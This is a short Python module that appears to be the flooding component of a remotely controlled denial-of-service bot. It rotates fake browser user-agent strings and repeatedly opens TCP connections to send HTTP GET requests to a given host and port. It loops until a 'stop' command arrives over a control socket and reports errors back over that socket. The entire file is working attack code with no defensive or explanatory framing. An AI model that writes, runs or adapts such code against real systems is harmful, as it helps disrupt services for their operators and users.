import time, sys, socket, threading, urllib.request, random


def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    return (uagent)



global data
data = '''
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive
'''


def usage(s):
    global soc 
    soc.send(str.encode("Check the IP and port!"))
    

def atack():
    global host 
    global port 
    global soc
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    message = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
                'utf-8')
    try:
        ddos.connect((host, int(port)))
        ddos.send(message)
        ddos.sendto(message, (host, int(port)))
        ddos.send(message)
    except:
        usage(soc)
    ddos.close()  


def stop():
    global dos 
    global soc 
    while True:
        data = soc.recv(1024)
        if data[:4].decode("utf-8") == 'stop':
            dos = False
            break 

    
def begin(hosts,ports, s):
    global host
    global soc 
    global port 
    global dos
    dos = True
    host = hosts 
    soc = s
    port = ports 
    user_agent()
    t = threading.Thread(target=stop)
    t.daemon = True 
    t.start()
    while dos == True:  
        atack()
       
